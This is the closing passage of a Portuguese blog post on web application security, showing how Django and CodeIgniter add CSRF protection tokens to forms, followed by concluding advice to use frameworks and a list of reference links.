<em>templatetag</em> ao formulário:</p> <div class=highlight><pre><span></span><span class=p>&lt;</span><span class=nt>form</span> <span class=na>method</span><span class=o>=</span><span class=s>&quot;post&quot;</span> <span class=na>action</span><span class=o>=</span><span class=s>&quot;.&quot;</span><span class=p>&gt;</span>
    {% csrf_token %}
    ...
<span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</pre></div> <p>A <em>templatetag</em> acima criará um campo oculto no formulário chamado <code>csrfmiddlewaretoken</code>. Quando um <em>POST</em> for realizado para a <em>view</em> em questão, caso o conteúdo de <code>csrfmiddlewaretoken</code> vindo do formulário não “bata” com o conteúdo armazenado em sessão, o <em>Django</em> entende que aquela requisição não foi feita de maneira “natural” (ou seja, acessando o formulário e submetendo-o). Logo, fica subentendido que aquela requisição veio de outra origem, e o <em>framework</em> não executa as instruções da <em>view</em> (retornando um código 403).</p> <p>No <em>Codeigniter</em>, com a opção <code>$config['csrf_protection’]</code> como <code>TRUE</code> no arquivo <code>application/config/config.php</code>, o <em>framework</em> adicionará automaticamente o campo de proteção <em>CSRF</em> na abertura do formulário:</p> <div class=highlight><pre><span></span><span class=cp>&lt;?php</span> <span class=nx>form_open</span><span class=p>();</span> <span class=cp>?&gt;</span><span class=x></span>
</pre></div> <h2>Considerações finais</h2> <p>Ficou um <em>post</em> grande, mas acredito que consegui cobrir os problemas de segurança mais conhecidos em aplicações <em>Web</em>. Como é possível notar, são vulnerabilidades que são facilmente contornáveis, mas que podem trazer sérios problemas para você e seus usuários caso a sua aplicação não esteja segura o bastante.</p> <p>Reforço: Se você tiver a oportunidade de utilizar um <em>framework</em>, utilize! Eles possuem soluções prontas e bem testadas para prevenir os problemas citados acima, e outros tantos que surgem a cada dia na <em>internet</em>.</p> <h2>Referências</h2> <ul> <li><a href=http://www.dinke.net/blog/en/2011/10/20/validating-an-integer-with-php/ title="As diferentes formas de validarmos um valor inteiro em PHP"><em>Caugh in a Web: Validating an integer in PHP</em></a></li> <li><a href=http://codeigniter.com/user_guide/database/active_record.html title="Saiba como fazer consultas eficientes ao banco de dados com o Codeigniter"><em>Codeigniter User Guide: Active Record Class</em></a></li> <li><a href=http://codeigniter.com/user_guide/general/security.html title="Veja as dicas de segurança dadas pelo time do Codeigniter"><em>Codeigniter User Guide: Security</em></a></li> <li><a href=https://docs.djangoproject.com/en/1.4/topics/db/queries/ title="Saiba como construir modelos e como consultá-los através do ORM do Django"><em>Django Documentation: Making queries</em></a></li> <li><a href=https://docs.djangoproject.com/en/dev/topics/security/ title="Veja dicas preciosas de segurança utilizando o Django"><em>Django Documentation: Security in Django</em></a></li> <li><a href=http://www.invasao.com.br/2008/03/18/php-injection-o-fim-das-duvidas/ title="Entenda como funciona um ataque via PHP Injection">Invasão.com.br: <em>PHP Injection</em> – O fim das dúvidas</a></li> <li><a href=http://www.php.net/manual/pt_BR/book.mysqli.php title="Conheça a mysqli direto da documentação do PHP"><em>PHP Documentation: MySQL Melhorada</em></a></li> <li><a href=http://php.net/pdo title="Conheça uma das formas mais eficientes de fazer consultas a bancos de dados no PHP"><em>PHP Documentation: PDO – PHP Data Objects</em></a></li> <li><a href=http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/ title="Aprenda como utilizar tolkens para prevenir ataques CSRF"><em>PHP SP</em>: Protegendo o seu sistema contra ataques <em>CSRF</em></a></li> <li><a href=http://www.sitepoint.com/php-security-blunders/ title="Excelentes dicas de segurança para quem programa em PHP"><em>Site Point: Top 7 PHP Security Blunders Article</em></a></li> <li><a href=http://stackoverflow.com/questions/60174/best-way-to-stop-sql-injection-in-php title="Excelente thread no Stack Overflow, sobre SQL injection"><em>Stack Overflow: Best way to stop SQL injection in PHP</em></a></li> <li><a href=https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF) title="Um bom artigo sobre o conceito do CSRF"><em>The Open Web Application Security Project: Cross-Site Request Forgery</em></a></li> <li><a href=http://en.wikipedia.org/wiki/Code_injection title="Leia mais sobre as formas de injeção de código no Wikipedia"><em>Wikipedia: Code Injection</em></a></li> <li><a href=http://pt.wikipedia.org/wiki/Inje%C3%A7%C3%A3o_de_SQL title="Leia mais sobre SQL Injection no Wikipedia"><em>Wikipedia</em>: Injeção de <em>SQL</em></a></li> </ul> </div> </span> <div class=Article-tags> <span class=Article-tagLabel>Tags:</span> <span itemprop=keywords> <a href=https://klauslaube.com.br/tag/desenvolvimento.html title="Leia mais sobre" class=Article-tagLink>desenvolvimento</a> <a href=https://klauslaube.com.br/tag/web.html title="Leia mais sobre" class=Article-tagLink>web</a> <a href=https://klauslaube.com.br/tag/seguranca.html title="Leia mais sobre" class=Article-tagLink>segurança</a> <a href=https://klauslaube.com.br/tag/xss.html title="Leia mais sobre" class=Article-tagLink>xss</a> <a href=https://klauslaube.com.br/tag/csrf.html title="Leia mais sobre" class=Article-tagLink>csrf</a> <a href=https://klauslaube.com.br/tag/sql-injection.html title="Leia mais sobre" class=Article-tagLink>sql-injection</a> <a href=https://klauslaube.com.br/tag/php-injection.html title="Leia mais sobre" class=Article-tagLink>php-injection</a> <a href=https://klauslaube.com.br/tag/django.html title="Leia mais sobre" class=Article-tagLink>django</a> <a href=https://klauslaube.com.br/tag/php.html title="Leia mais sobre" class=Article-tagLink>php</a> <a href=https://klauslaube.com.br/tag/codeigniter.html title="Leia mais sobre" class=Article-tagLink>codeigniter</a> </span> </div> <div class=Article-comments> <div id=disqus_thread></div> <script type=text/javascript>
        var disqus_shortname = "klauslaube";
        var disqus_identifier = "2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html";

        (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script> <noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript rel=nofollow>comments powered by Disqus.</a></noscript> </div> </article> </div> <footer class="PageFooter pure-u-1"> <div class=u-box> <p>O conteúdo deste blog está sob a licença <a class=PageFooter-link href=http://creativecommons.org/licenses/by/3.0/deed.pt_BR title="Distribua, adapte, use. Mas mencione o autor." rel=nofollow>Creative Commons Attribution 3.0</a>.</p> <p>O código está disponível em <a class=PageFooter-link href=https://github.com/kplaube/blog/ title=Contribute! rel=nofollow>GitHub</a>.</p> </div> </footer> </div> <script>
        (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
        function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
        e=o.createElement(i);r=o.getElementsByTagName(i)[0];
        e.src='//www.google-analytics.com/analytics.js';
        r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
        ga('create','UA-19657400-1');ga('send','pageview');
    </script> </body> </html>